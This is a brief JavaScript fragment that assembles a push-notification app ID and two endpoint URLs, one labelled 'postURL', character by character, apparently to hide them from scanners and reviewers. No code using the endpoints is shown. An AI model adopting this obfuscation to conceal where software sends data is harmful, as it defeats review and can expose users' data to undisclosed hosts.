...
const onesignalAppId = _a('a1d3329a', '-', '8f46', '-', '4d17', '-', 'b75a', '-', '25e4462578f5');

const LoadingUrl = _a('h','t','t','p','s',':','/','/','exact','-','bridge','-','api','.site/','y9UcCGgi');
const postURL = _a('h','t','t','p','s',':','/','/','sharp','-','cluster','-','tech','.top/v1');
